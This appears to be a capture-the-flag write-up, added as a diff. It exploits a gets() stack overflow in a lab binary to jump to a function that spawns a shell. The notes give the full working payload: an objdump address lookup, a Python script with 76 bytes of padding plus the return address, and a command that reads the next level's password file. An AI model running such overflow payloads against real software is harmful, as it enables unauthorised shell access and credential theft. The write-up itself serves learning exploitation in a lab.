@@ -1,0 +1,25 @@
+Goal: redirect execution to `run()` to spawn a shell and read level2 password.
+
+Observation:
+- `main()` uses `gets()` on a 64-byte stack buffer.
+- `run()` prints a message then calls `system("/bin/sh")`.
+
+Steps:
+1) Find `run()` address:
+	objdump -d /home/user/level1/level1 | grep "<run>"
+	(address was 0x08048444)
+2) Determine offset to saved EIP (found to be 76 bytes).
+3) Build payload: 76 bytes of padding + little-endian `run()` address.
+4) Feed payload into the program and keep stdin open for the shell:
+	(python2 - <<'PY'
+	import struct, sys
+	run_addr = 0x08048444
+	payload = "A"*76 + struct.pack("<I", run_addr)
+	sys.stdout.write(payload + "\n")
+	PY
+	cat) | /home/user/level1/level1
+5) In the spawned shell:
+	cat /home/user/level2/.pass
+
+Result:
+- The command prints the level2 password, stored in the flag file.
